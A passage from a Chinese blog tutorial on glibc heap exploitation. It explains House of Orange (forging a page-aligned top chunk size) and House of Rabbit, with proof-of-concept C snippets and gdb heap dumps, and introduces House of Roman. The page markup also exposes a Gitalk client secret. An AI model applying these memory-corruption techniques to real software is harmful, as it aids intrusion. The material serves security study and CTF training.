<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>如前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
<p>详细过程：假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到 libc.so 的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p>
<p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p>
<p>在 sysmalloc 函数中存在对 top chunk size 的 check，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小必须大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 top chunk 必须标识前一个 chunk 处于 inuse 状态，并且 top chunk 的结束地址必定是页对齐的。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。</p>
<p>我们总结一下伪造的 top chunk size 的要求：</p>
<ul>
<li><p>伪造的 size 必须要对齐到内存页</p>
</li>
<li><p>size 要大于 MINSIZE(0x10)</p>
</li>
<li><p>size 要小于之后申请的 chunk size + MINSIZE(0x10)</p>
</li>
<li><p>size 的 prev inuse 位必须为 1</p>
</li>
</ul>
<p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>这里给出了一个示例程序，程序模拟了一个溢出覆盖到 top chunk 的 size 域。我们试图把 size 改小从而实现 brk 扩展，并把原有的 top chunk 放入 unsorted bin 中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fake_size 0x41</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">void</span> *)((<span class="keyword">int</span>)ptr+<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">long</span> <span class="keyword">long</span>*)ptr)=fake_size; <span class="comment">// overwrite top chunk size</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们把 top chunk 的 size 覆盖为 0x41。之后申请大于这个尺寸的堆块，即 0x60。 但是当我们执行这个示例时会发现，这个程序并不能利用成功，原因在于 assert 并没有被满足从而抛出了异常。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[#<span class="number">0</span>] <span class="number">0x7ffff7a42428</span> → Name: __GI_raise(sig=<span class="number">0x6</span>)</span><br><span class="line">[#<span class="number">1</span>] <span class="number">0x7ffff7a4402a</span> → Name: __GI_abort()</span><br><span class="line">[#<span class="number">2</span>] <span class="number">0x7ffff7a8a2e8</span> → Name: __malloc_assert(assertion=<span class="number">0x7ffff7b9e150</span> <span class="string">"(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)"</span>, file=<span class="number">0x7ffff7b9ab85</span> <span class="string">"malloc.c"</span>, <span class="built_in">line</span>=<span class="number">0x95a</span>, function=<span class="number">0x7ffff7b9e998</span> &lt;__func__<span class="number">.11509</span>&gt; <span class="string">"sysmalloc"</span>)</span><br><span class="line">[#<span class="number">3</span>] <span class="number">0x7ffff7a8e426</span> → Name: sysmalloc(nb=<span class="number">0x70</span>, av=<span class="number">0x7ffff7dd1b20</span> &lt;main_arena&gt;)</span><br></pre></td></tr></table></figure>

<p>我们回头来看一下 assert 的条件，可以发现之前列出的条目都被满足了除了第一条：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>伪造的size必须要对齐到内存页</span><br></pre></td></tr></table></figure>

<p>什么是对齐到内存页呢？我们知道现代操作系统都是以内存页为单位进行内存管理的，一般内存页的大小是 4kb。那么我们伪造的 size 就必须要对齐到这个尺寸。在覆盖之前 top chunk 的 size 大小是 20fe1，通过计算得知 0x602020+0x20fe0=0x623000 是对于 0x1000（4kb）对齐的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fe1</span> &lt;== top chunk</span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。而 0x40 不满足对齐，因此不能实现利用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fake_size 0x1fe1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">void</span> *)((<span class="keyword">int</span>)ptr+<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">long</span> <span class="keyword">long</span>*)ptr)=fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行分配之后我们可以观察到原来的堆经过了 brk 扩展：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//原有的堆</span></span><br><span class="line"><span class="number">0x0000000000602000</span> <span class="number">0x0000000000623000</span> <span class="number">0x0000000000000000</span> rw- [heap]</span><br><span class="line"></span><br><span class="line"><span class="comment">//经过扩展的堆</span></span><br><span class="line"><span class="number">0x0000000000602000</span> <span class="number">0x0000000000646000</span> <span class="number">0x0000000000000000</span> rw- [heap]</span><br></pre></td></tr></table></figure>

<p>我们的申请被分配到 0x623010 的位置，同时原有的堆被置入 unsorted bin：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[+] unsorted_bins[0]: <span class="attribute">fw</span>=0x602020, <span class="attribute">bk</span>=0x602020</span><br><span class="line"> →   Chunk(<span class="attribute">addr</span>=0x602030, <span class="attribute">size</span>=0x1fc0, <span class="attribute">flags</span>=PREV_INUSE)</span><br></pre></td></tr></table></figure>

<p>因为 unsorted bin 中存在块，所以我们下次的分配会切割这个块：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"> malloc(0x60);</span><br><span class="line"> 0x602030</span><br><span class="line"></span><br><span class="line">[+] unsorted_bins[0]: <span class="attribute">fw</span>=0x602090, <span class="attribute">bk</span>=0x602090</span><br><span class="line"> →   Chunk(<span class="attribute">addr</span>=0x6020a0, <span class="attribute">size</span>=0x1f50, <span class="attribute">flags</span>=PREV_INUSE)</span><br></pre></td></tr></table></figure>

<p>可以看到分配的内存是从 unsorted bin 中切割的，内存布局如下：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602030</span>:   <span class="number">0x00007ffff7dd2208</span>  <span class="number">0x00007ffff7dd2208</span> &lt;== 未被清零的unsorted bin链表</span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000602020</span>  <span class="number">0x0000000000602020</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000001f51</span> &lt;== 切割剩下的新unsorted bin</span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>其实 house of orange 的要点正在于此，之后的利用因为涉及到_IO_FILE 的知识，放到 IO_FILE 部分进行学习记录。</p>
<h3 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h3><p>House of rabbit 是一种伪造堆块的技术，一般运用在 fastbin attack 中，因为 unsorted bin 等其它的 bin 有更好的利用手段。</p>
<h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>我们知道，fastbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出。而 house of rabbit 就利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块，为进一步的利用做准备。</p>
<p>原作者<a href="https://github.com/shift-crops/House_of_Rabbit">POC</a></p>
<p>前提条件：</p>
<ul>
<li>1、可以修改 fastbin 的 fd 指针或 size</li>
<li>2、可以触发 malloc consolidate(merge top 或 malloc big chunk 等等)</li>
</ul>
<p>下面来看一下 POC：</p>
<p>POC 1: <code>modify the size of fastbin chunk</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk1=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//0x602000</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk2=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//0x602050</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="built_in">free</span>(chunk2);</span><br><span class="line"><span class="comment">/* Heap layout</span></span><br><span class="line"><span class="comment">0000| 0x602000 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0008| 0x602008 --&gt; 0x51 ('Q')</span></span><br><span class="line"><span class="comment">0016| 0x602010 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">..... </span></span><br><span class="line"><span class="comment">0080| 0x602050 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0088| 0x602058 --&gt; 0x51 ('Q')</span></span><br><span class="line"><span class="comment">0096| 0x602060 --&gt; 0x602000 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0104| 0x602068 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">...... </span></span><br><span class="line"><span class="comment">0160| 0x6020a0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0168| 0x6020a8 --&gt; 0x21 ('!')</span></span><br><span class="line"><span class="comment">0176| 0x6020b0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0184| 0x6020b8 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">chunk1[<span class="number">-1</span>]=<span class="number">0xa1</span>; <span class="comment">//modify chunk1 size to be 0xa1</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1000</span>);  <span class="comment">//allocate a large chunk, trigger malloc consolidate</span></span><br><span class="line"><span class="comment">/*Chunk1 overlap with chunk2 now</span></span><br><span class="line"><span class="comment">gdb-peda$ telescope 0x602000 100</span></span><br><span class="line"><span class="comment">0000| 0x602000 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0008| 0x602008 --&gt; 0xa1 </span></span><br><span class="line"><span class="comment">0016| 0x602010 --&gt; 0x7ffff7dd1c08 --&gt; 0x7ffff7dd1bf8 --&gt; 0x7ffff7dd1be8 --&gt; 0x7ffff7dd1bd8 --&gt; 0x7ffff7dd1bc8 (--&gt; ...)</span></span><br><span class="line"><span class="comment">0024| 0x602018 --&gt; 0x7ffff7dd1c08 --&gt; 0x7ffff7dd1bf8 --&gt; 0x7ffff7dd1be8 --&gt; 0x7ffff7dd1bd8 --&gt; 0x7ffff7dd1bc8 (--&gt; ...)</span></span><br><span class="line"><span class="comment">0032| 0x602020 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">.....</span></span><br><span class="line"><span class="comment">0080| 0x602050 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0088| 0x602058 --&gt; 0x51 ('Q')</span></span><br><span class="line"><span class="comment">0096| 0x602060 --&gt; 0x7ffff7dd1bb8 --&gt; 0x7ffff7dd1ba8 --&gt; 0x7ffff7dd1b98 --&gt; 0x7ffff7dd1b88 --&gt; 0x7ffff7dd1b78 (--&gt; ...)</span></span><br><span class="line"><span class="comment">0104| 0x602068 --&gt; 0x7ffff7dd1bb8 --&gt; 0x7ffff7dd1ba8 --&gt; 0x7ffff7dd1b98 --&gt; 0x7ffff7dd1b88 --&gt; 0x7ffff7dd1b78 (--&gt; ...)</span></span><br><span class="line"><span class="comment">0112| 0x602070 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0120| 0x602078 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">....</span></span><br><span class="line"><span class="comment">0152| 0x602098 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0160| 0x6020a0 --&gt; 0xa0 </span></span><br><span class="line"><span class="comment">0168| 0x6020a8 --&gt; 0x20 (' ')</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">gdb-peda$ heapinfo</span></span><br><span class="line"><span class="comment">(0x20)     fastbin[0]: 0x0</span></span><br><span class="line"><span class="comment">(0x30)     fastbin[1]: 0x0</span></span><br><span class="line"><span class="comment">(0x40)     fastbin[2]: 0x0</span></span><br><span class="line"><span class="comment">(0x50)     fastbin[3]: 0x0</span></span><br><span class="line"><span class="comment">(0x60)     fastbin[4]: 0x0</span></span><br><span class="line"><span class="comment">(0x70)     fastbin[5]: 0x0</span></span><br><span class="line"><span class="comment">(0x80)     fastbin[6]: 0x0</span></span><br><span class="line"><span class="comment">                  top: 0x603450 (size : 0x1fbb0) </span></span><br><span class="line"><span class="comment">       last_remainder: 0x0 (size : 0x0) </span></span><br><span class="line"><span class="comment">            unsortbin: 0x0</span></span><br><span class="line"><span class="comment">(0x050)  smallbin[ 3]: 0x602050</span></span><br><span class="line"><span class="comment">(0x0a0)  smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) )</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>POC 2: <code>modify FD pointer</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk1=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//0x602000</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//0x602050</span></span><br><span class="line"></span><br><span class="line">chunk2[<span class="number">1</span>]=<span class="number">0x31</span>; <span class="comment">//fake chunk size 0x30</span></span><br><span class="line">chunk2[<span class="number">7</span>]=<span class="number">0x21</span>  <span class="comment">//fake chunk's next chunk</span></span><br><span class="line">chunk2[<span class="number">11</span>]=<span class="number">0x21</span> <span class="comment">//fake chunk's next chunk's next chuck</span></span><br><span class="line"><span class="comment">/* Heap laylout</span></span><br><span class="line"><span class="comment">0000| 0x602000 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0008| 0x602008 --&gt; 0x51 ('Q')</span></span><br><span class="line"><span class="comment">0016| 0x602010 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">0080| 0x602050 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0088| 0x602058 --&gt; 0x111 </span></span><br><span class="line"><span class="comment">0096| 0x602060 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0104| 0x602068 --&gt; 0x31 ('1')</span></span><br><span class="line"><span class="comment">0112| 0x602070 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">0144| 0x602090 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0152| 0x602098 --&gt; 0x21 ('!')</span></span><br><span class="line"><span class="comment">0160| 0x6020a0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0168| 0x6020a8 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0176| 0x6020b0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0184| 0x6020b8 --&gt; 0x21 ('!')</span></span><br><span class="line"><span class="comment">0192| 0x6020c0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">0352| 0x602160 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0360| 0x602168 --&gt; 0x20ea1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">free</span>(chunk1);</span><br><span class="line">chuck1[<span class="number">0</span>]=<span class="number">0x602060</span>;<span class="comment">// modify the fd of chunk1</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gdb-peda$ heapinfo</span></span><br><span class="line"><span class="comment">(0x20)     fastbin[0]: 0x0</span></span><br><span class="line"><span class="comment">(0x30)     fastbin[1]: 0x0</span></span><br><span class="line"><span class="comment">(0x40)     fastbin[2]: 0x0</span></span><br><span class="line"><span class="comment">(0x50)     fastbin[3]: 0x602000 --&gt; 0x602060 (size error (0x30)) --&gt; 0x0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">5000</span>);<span class="comment">// malloc a  big chunk to trigger malloc consolidate</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gdb-peda$ heapinfo</span></span><br><span class="line"><span class="comment">(0x20)     fastbin[0]: 0x0</span></span><br><span class="line"><span class="comment">(0x30)     fastbin[1]: 0x0</span></span><br><span class="line"><span class="comment">(0x40)     fastbin[2]: 0x0</span></span><br><span class="line"><span class="comment">(0x50)     fastbin[3]: 0x0</span></span><br><span class="line"><span class="comment">(0x60)     fastbin[4]: 0x0</span></span><br><span class="line"><span class="comment">(0x70)     fastbin[5]: 0x0</span></span><br><span class="line"><span class="comment">(0x80)     fastbin[6]: 0x0</span></span><br><span class="line"><span class="comment">                  top: 0x6034f0 (size : 0x1fb10) </span></span><br><span class="line"><span class="comment">       last_remainder: 0x0 (size : 0x0) </span></span><br><span class="line"><span class="comment">            unsortbin: 0x0</span></span><br><span class="line"><span class="comment">(0x050)  smallbin[ 3]: 0x602000</span></span><br><span class="line"><span class="comment">(0x030)  smallbin[ 1]: 0x602060</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>原理很简单，就是通过修改 fastbin chunk 的 size(如上面的 POC 1 所示) 直接构造 overlap chunk，或者修改 fd(如面的 POC 2 所示)，让它指向一个 fake chunk，触发 malloc consolidate 之后让这个 fake chunk 成为一个合法的 chunk。</p>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>House of rabbit 的优点是容易构造 overlap chunk，由于可以基于 fastbin attack，甚至不需要 leak 就可以完成攻击。大家可以通过例题的练习加深对这个攻击的理解。</p>
<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><ul>
<li>HITB-GSEC-XCTF 2018 mutepig</li>
</ul>
<h3 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h3><p>House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attack 结合的一个小 trick。</p>
<h4 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h4><p>该技术用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。</p>
</div><ul class="post-copyright"><li><strong>Post Title: </strong><a href="http://ggb0n.cool/2020/06/07/堆溢出-Housese_Of_XXX/">堆溢出-Housese_Of_XXX</a></li><li><strong>Post Author: </strong><a href="http://ggb0n.cool">ggb0n</a></li><li><strong>Post Link: </strong><a href="http://ggb0n.cool/2020/06/07/堆溢出-Housese_Of_XXX/">http://ggb0n.cool/2020/06/07/堆溢出-Housese_Of_XXX/</a></li><li><strong>Copyright Notice: </strong><span>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</span></li></ul><div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># Related Post</span><br><span>  1.<a class="is-size-6" href="/2020/06/17/%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/" target="_blank">整形溢出基础</a><br></span><span>  2.<a class="is-size-6" href="/2020/06/14/IO-FILE%E7%9B%B8%E5%85%B3/" target="_blank">IO-FILE相关</a><br></span><span>  3.<a class="is-size-6" href="/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Tcache_Attack/" target="_blank">堆溢出-Tcache_Attack</a><br></span><span>  4.<a class="is-size-6" href="/2020/06/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/" target="_blank">堆溢出基础</a><br></span><span>  5.<a class="is-size-6" href="/2020/05/13/%E5%85%A5%E5%9D%91%E4%BA%8C%E8%BF%9B%E5%88%B6/" target="_blank">入坑二进制</a><br></span></div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># Recommend Post</span><br><span>  1.<a class="is-size-6" href="/2020/06/29/TCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank">TCTF2020部分题解</a><br></span><span>  2.<a class="is-size-6" href="/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/" target="_blank">第五空间pwn题练习</a><br></span><span>  3.<a class="is-size-6" href="/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Tcache_Attack/" target="_blank">堆溢出-Tcache_Attack</a><br></span><span>  4.<a class="is-size-6" href="/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Housese_Of_XXX/" target="_blank">堆溢出-Housese_Of_XXX</a><br></span><span>  5.<a class="is-size-6" href="/2020/06/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/" target="_blank">堆溢出基础</a><br></span><span>  6.<a class="is-size-6" href="/2020/05/13/%E5%85%A5%E5%9D%91%E4%BA%8C%E8%BF%9B%E5%88%B6/" target="_blank">入坑二进制</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button is-success donate"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="http://ggb0n.cool/images/emFuc2hhbmc=.png" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Tcache_Attack/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">堆溢出-Tcache_Attack</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/06/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/"><span class="level-item">堆溢出基础</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/gitalk/1.6.0/gitalk.css"><script> $.getScript('/js/gitalk.min.js', function () { 
            var gitalk = new Gitalk({
            id: 'a1a6c8ae7225ac274f3e9e6c877cd217',
            repo: 'blog_comment',
            owner: 'ggb0n',
            clientID: '0a75c84e24da4e774d10',
            clientSecret: '80c72733da730b019e5047ae6c7eff937914a4d9',
            admin: ["ggb0n"],
            createIssueManually: true,
            distractionFreeMode: true,
            perPage: 10,
            pagerDirection: 'last',
            
            
            enableHotKey: true,
            isLocked: false
        })
        gitalk.render('comment-container')});</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget toc-scroll" id="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-House-Of-Einherjar" href="#House-Of-Einherjar"><span>House Of Einherjar</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-漏洞原理" href="#漏洞原理"><span>漏洞原理</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-后向合并操作" href="#后向合并操作"><span>后向合并操作</span></a></li><li><a class="is-flex toc-item" id="toc-item-利用原理" href="#利用原理"><span>利用原理</span></a></li><li><a class="is-flex toc-item" id="toc-item-利用过程" href="#利用过程"><span>利用过程</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-攻击过程示例" href="#攻击过程示例"><span>攻击过程示例</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-总结" href="#总结"><span>总结</span></a></li></ul></li></ul></li><li><a class="is-flex toc-item" id="toc-item-House-of-Lore" href="#House-of-Lore"><span>House of Lore</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-原理" href="#原理"><span>原理</span></a></li><li><a class="is-flex toc-item" id="toc-item-攻击过程代码" href="#攻击过程代码"><span>攻击过程代码</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-House-of-Orange" href="#House-of-Orange"><span>House of Orange</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-概述" href="#概述"><span>概述</span></a></li><li><a class="is-flex toc-item" id="toc-item-原理-1" href="#原理-1"><span>原理</span></a></li><li><a class="is-flex toc-item" id="toc-item-示例" href="#示例"><span>示例</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-House-of-Rabbit" 